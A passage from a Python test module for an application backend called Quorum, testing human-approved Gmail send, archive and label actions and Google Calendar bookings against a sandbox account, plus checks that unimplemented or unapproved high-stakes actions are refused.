        async with httpx.AsyncClient(timeout=15.0) as client, pool.acquire() as conn:
            result = await execute_approved_action(
                conn,
                action_type=ActionType.SEND_EMAIL,
                payload={
                    "to": _SANDBOX_EMAIL,
                    "subject": f"Real Quorum execution test {marker}",
                    "body": "A real, harmless, automated execution test -- safe to ignore or delete.",
                },
                user_id=real_user_id,
                approved_by_user_id=real_user_id,
                google_access_token=access_token,
                http_client=client,
            )
        assert result.executed is True
        assert "message_id" in result.detail
    finally:
        await _cleanup_real_gmail_messages_matching(pool, real_user_id, marker)


async def test_execute_approved_action_archive_and_label_email_a_real_genuine_modify_via_gmail(pool):
    """The real capstone for ARCHIVE_EMAIL/LABEL_EMAIL: sends a real
    probe message directly (bypassing `execute_approved_action`, to
    isolate what THIS test is proving), then archives and labels it for
    real through `execute_approved_action`, polling Gmail's own real
    API afterward to confirm each label change genuinely took effect.

    A real, disclosed CRITICAL-tier review finding fixed here (DEC-142,
    H4): an earlier version checked `INBOX`/`IMPORTANT` immediately
    after each modify call with no real wait -- DEC-140 already
    established that Gmail applies the real `INBOX` label on delivery,
    not synchronously with `messages.send`'s own response, so an
    immediate check could pass even if the modify branch did nothing at
    all. This version polls (bounded) until the PRE-condition is
    genuinely observed before acting, so the post-condition check
    genuinely depends on the real API call having happened."""
    if not _HAS_REAL_GOOGLE_CONFIG:
        pytest.skip("no real Google OAuth config in this environment")

    from quorum_backend.auth.google_token_store import get_valid_google_access_token

    settings = get_settings()
    real_user_id = await _real_sandbox_user_id(pool)
    if real_user_id is None:
        pytest.skip("no real, live Google token stored for the real sandbox account (see DEC-139)")
    marker = f"real-modify-test-{uuid.uuid4()}"

    access_token = await get_valid_google_access_token(
        pool, internal_user_id=real_user_id, client_id=settings.google_oauth_client_id,
        client_secret=settings.google_oauth_client_secret, encryption_key=settings.google_token_encryption_key,
    )
    raw_message = (
        f"To: {_SANDBOX_EMAIL}\r\n"
        f"Subject: Real Quorum modify test {marker}\r\n"
        "Content-Type: text/plain; charset=UTF-8\r\n\r\n"
        "A real, harmless, automated modify test -- safe to ignore or delete."
    )
    encoded = base64.urlsafe_b64encode(raw_message.encode()).decode()

    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            send_response = await client.post(
                "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
                json={"raw": encoded}, headers={"Authorization": f"Bearer {access_token}"},
            )
            assert send_response.status_code == 200
            message_id = send_response.json()["id"]

            # Real, bounded poll for the real PRE-condition (INBOX
            # genuinely present) before archiving -- DEC-140's own
            # finding: real delivery, and therefore the real INBOX
            # label, is not synchronous with the send response.
            label_ids = await _poll_for_real_label_state(client, access_token, message_id, present="INBOX")
            assert "INBOX" in label_ids

            async with pool.acquire() as conn:
                archive_result = await execute_approved_action(
                    conn, action_type=ActionType.ARCHIVE_EMAIL, payload={"message_id": message_id}, user_id=real_user_id,
                    google_access_token=access_token, http_client=client,
                )
            assert archive_result.executed is True

            label_ids_after_archive = await _poll_for_real_label_state(client, access_token, message_id, absent="INBOX")
            assert "INBOX" not in label_ids_after_archive  # genuinely archived, not just claimed

            async with pool.acquire() as conn:
                label_result = await execute_approved_action(
                    conn, action_type=ActionType.LABEL_EMAIL, payload={"message_id": message_id, "label_id": "IMPORTANT"},
                    user_id=real_user_id, google_access_token=access_token, http_client=client,
                )
            assert label_result.executed is True

            label_ids_after_label = await _poll_for_real_label_state(client, access_token, message_id, present="IMPORTANT")
            assert "IMPORTANT" in label_ids_after_label  # genuinely labeled, not just claimed
    finally:
        await _cleanup_real_gmail_messages_matching(pool, real_user_id, marker)


async def test_execute_approved_action_create_calendar_event_external_a_real_genuine_booking_via_google_calendar(pool):
    """The real capstone for `CREATE_CALENDAR_EVENT_EXTERNAL` (`DEC-
    151`): a genuine, human-approved booking through Google Calendar's
    real, live API v3 against this project's own dedicated sandbox
    account (`quorum.dev.sandbox@gmail.com`, `DEC-139`) -- inviting the
    sandbox account ITSELF (never a real, uninvolved third party, per
    Rule 5), using a real access token resolved from the real POOL
    before this call, exactly like the `SEND_EMAIL` capstone above.

    Unlike a real, sent Gmail message (which can never be un-sent), a
    real Google Calendar event genuinely CAN be cleaned up afterward --
    this test does so directly against the real API, confirming both
    the real create AND the real delete succeed, never leaving debris
    in the real, live sandbox calendar."""
    if not _HAS_REAL_GOOGLE_CONFIG:
        pytest.skip("no real Google OAuth config in this environment")

    from quorum_backend.auth.google_token_store import get_valid_google_access_token

    settings = get_settings()
    real_user_id = await _real_sandbox_user_id(pool)
    if real_user_id is None:
        pytest.skip("no real, live Google token stored for the real sandbox account (see DEC-139)")

    access_token = await get_valid_google_access_token(
        pool, internal_user_id=real_user_id, client_id=settings.google_oauth_client_id,
        client_secret=settings.google_oauth_client_secret, encryption_key=settings.google_token_encryption_key,
    )
    marker = f"Real Quorum calendar execution test {uuid.uuid4()}"
    start = datetime.now(timezone.utc).replace(microsecond=0)
    # A real, disclosed test bug fixed here (CRITICAL-tier review,
    # `DEC-151`, M3): `start.replace(hour=(start.hour + 1) % 24)` never
    # advances the real calendar DATE, so a real test run starting in
    # the 23:00 UTC hour previously produced an `end` genuinely BEFORE
    # `start` -- exactly the malformed shape this session's own new
    # `end > start` check (M2) now correctly refuses. A real
    # `timedelta` is the actual fix, not a narrower hour-wrap special
    # case.
    end = start + timedelta(hours=1)

    real_event_id: str | None = None
    try:
        async with httpx.AsyncClient(timeout=15.0) as client, pool.acquire() as conn:
            result = await execute_approved_action(
                conn,
                action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL,
                payload={
                    "start": start.isoformat(),
                    "end": end.isoformat(),
                    "title": marker,
                    "has_external_invitee": True,
                    "invitee_email": _SANDBOX_EMAIL,
                },
                user_id=real_user_id,
                approved_by_user_id=real_user_id,
                google_access_token=access_token,
                http_client=client,
            )
            # A real, disclosed test bug fixed here (CRITICAL-tier
            # review, `DEC-151`, L2): `real_event_id` is parsed
            # immediately, BEFORE either assertion below -- if a real
            # event were genuinely created but one of these assertions
            # then failed, the old ordering would leave `real_event_id`
            # at `None` and the `finally` block's own real cleanup
            # would never run, leaking a real event into the live
            # sandbox calendar.
            real_event_id = result.detail.split("event_id=")[1].split(",")[0].strip("'") if result.executed else None
            assert result.executed is True
            assert "event_id" in result.detail

            # Real, live follow-up GET -- proves a real event genuinely
            # exists on the real calendar, not just that this module
            # believes a `200` happened.
            get_response = await client.get(
                f"https://www.googleapis.com/calendar/v3/calendars/primary/events/{real_event_id}",
                headers={"Authorization": f"Bearer {access_token}"},
            )
            assert get_response.status_code == 200
            real_event = get_response.json()
            assert real_event["summary"] == marker
            assert any(a.get("email") == _SANDBOX_EMAIL for a in real_event.get("attendees", []))
    finally:
        if real_event_id is not None:
            async with httpx.AsyncClient(timeout=15.0) as client:
                delete_response = await client.delete(
                    f"https://www.googleapis.com/calendar/v3/calendars/primary/events/{real_event_id}",
                    headers={"Authorization": f"Bearer {access_token}"},
                )
                assert delete_response.status_code in (200, 204), (
                    f"cleanup's own real Calendar delete call failed: {delete_response.text}"
                )


async def _poll_for_real_label_state(
    client: httpx.AsyncClient, access_token: str, message_id: str, *, present: str | None = None, absent: str | None = None,
    attempts: int = 10, delay_seconds: float = 1.0,
) -> list[str]:
    """A real, bounded poll against Gmail's own live API -- real
    delivery genuinely isn't synchronous with a real send/modify
    response (DEC-140's own finding), so a single, immediate check can
    observe a real, stale label state. Returns the real, final
    `labelIds` list, whether or not the awaited condition was reached
    (the caller's own assertion is what actually fails the test)."""
    import asyncio

    label_ids: list[str] = []
    for _ in range(attempts):
        check = await client.get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{message_id}",
            params={"format": "minimal"}, headers={"Authorization": f"Bearer {access_token}"},
        )
        label_ids = check.json().get("labelIds", [])
        if present is not None and present in label_ids:
            return label_ids
        if absent is not None and absent not in label_ids:
            return label_ids
        await asyncio.sleep(delay_seconds)
    return label_ids


async def _cleanup_real_gmail_messages_matching(pool, real_user_id: str, marker: str) -> None:
    """Finds and trashes every real Gmail message this test run itself
    created (matched by its own unique marker subject), the same real
    cleanup discipline `test_email_ingestion.py`'s own capstone test
    established this session (DEC-140, review finding M2) -- never
    leaves real test debris in the real, live sandbox account. A real,
    disclosed CRITICAL-tier review finding fixed here (DEC-142, L7):
    an earlier version never checked whether a real access token was
    actually obtained, so a `None` token would silently no-op (a real
    401, an empty message list, zero visible signal) instead of a real,
    loud failure."""
    settings = get_settings()
    from quorum_backend.auth.google_token_store import get_valid_google_access_token

    access_token = await get_valid_google_access_token(
        pool, internal_user_id=real_user_id, client_id=settings.google_oauth_client_id,
        client_secret=settings.google_oauth_client_secret, encryption_key=settings.google_token_encryption_key,
    )
    assert access_token is not None, "cleanup itself could not obtain a real access token -- real debris may remain"
    async with httpx.AsyncClient(timeout=15.0) as client:
        list_response = await client.get(
            "https://gmail.googleapis.com/gmail/v1/users/me/messages",
            params={"q": f"subject:{marker}"}, headers={"Authorization": f"Bearer {access_token}"},
        )
        assert list_response.status_code == 200, f"cleanup's own real Gmail list call failed: {list_response.text}"
        for message in list_response.json().get("messages", []):
            await client.post(
                f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{message['id']}/trash",
                headers={"Authorization": f"Bearer {access_token}"},
            )


async def test_execute_approved_action_is_honest_about_every_genuinely_unimplemented_action_type(pool, user_id):
    """A real, disclosed CRITICAL-tier review finding (DEC-142, M5):
    `SEND_EMAIL`/`ARCHIVE_EMAIL`/`LABEL_EMAIL` are now genuinely
    executable (given real credentials this test deliberately never
    provides), so this test's own real scope narrows to the
    `ActionType`s that still have NO real execution path at all AND
    are not real `Stakes.S3` -- asserting the SPECIFIC, real "no real
    execution path exists yet" detail, not merely a falsy result
    (which a bug routing one of these into the Gmail branch by mistake
    would still pass on a bare `executed is False` check). `CREATE_
    CALENDAR_EVENT_EXTERNAL` is excluded here on purpose -- it is real
    `Stakes.S3` too, so it correctly hits the real, structural S3
    backstop BEFORE ever reaching the "no execution path" fallback
    (exactly the review's own H2 fix working as intended -- see the
    dedicated test for it below). `UPDATE_BUDGET` is excluded as of
    `DEC-148` -- it is now genuinely executable too; see its own
    dedicated tests below."""
    genuinely_unimplemented_non_s3 = [
        t for t in ActionType
        if t not in (
            ActionType.CREATE_TASK, ActionType.LOG_EXPENSE, ActionType.SEND_EMAIL,
            ActionType.ARCHIVE_EMAIL, ActionType.LABEL_EMAIL, ActionType.CREATE_CALENDAR_EVENT_EXTERNAL,
            ActionType.UPDATE_BUDGET,
        )
    ]
    assert len(genuinely_unimplemented_non_s3) == 4  # a real, live guard against this enum silently growing unnoticed

    async with pool.acquire() as conn:
        for action_type in genuinely_unimplemented_non_s3:
            result = await execute_approved_action(conn, action_type=action_type, payload={}, user_id=user_id)
            assert result.executed is False, f"{action_type} unexpectedly executed"
            assert "No real execution path exists yet" in result.detail

    assert await pool.fetchrow("SELECT 1 FROM tasks WHERE user_id = $1", uuid.UUID(user_id)) is None
    assert await pool.fetchrow("SELECT 1 FROM expenses WHERE user_id = $1", uuid.UUID(user_id)) is None


async def test_execute_approved_action_create_calendar_event_external_also_hits_the_real_s3_backstop(pool, user_id):
    """The real, structural benefit of hoisting the S3 check (DEC-142
    review finding H2), still proven true now that `CREATE_CALENDAR_
    EVENT_EXTERNAL` has a real execution branch (`DEC-151`): the
    backstop runs BEFORE that branch is ever reached, for the exact
    same reason it always has -- `CREATE_CALENDAR_EVENT_EXTERNAL` is
    real `Stakes.S3`, checked once, structurally, for every S3 type."""
    async with pool.acquire() as conn:
        result = await execute_approved_action(
            conn, action_type=ActionType.CREATE_CALENDAR_EVENT_EXTERNAL, payload={}, user_id=user_id,
        )
    assert result.executed is False
    assert "S3" in result.detail
    assert "approved_by_user_id" in result.detail


async def test_execute_approved_action_gmail_capable_types_are_honestly_non_executing_with_no_real_credentials(pool, user_id):
    """The real counterpart to the test above -- `SEND_EMAIL`/`ARCHIVE_
    EMAIL`/`LABEL_EMAIL` given an empty payload and no real credentials
    at all must still be a real, honest `executed=False`, never a raw
    exception and never a real Gmail call."""
    async with pool.acquire() as conn:
        for action_type in (ActionType.SEND_EMAIL, ActionType.ARCHIVE_EMAIL, ActionType.LABEL_EMAIL):
            result = await execute_approved_action(conn, action_type=action_type, payload={}, user_id=user_id)
            assert result.executed is False, f"{action_type} unexpectedly executed"
            assert len(result.detail) > 0
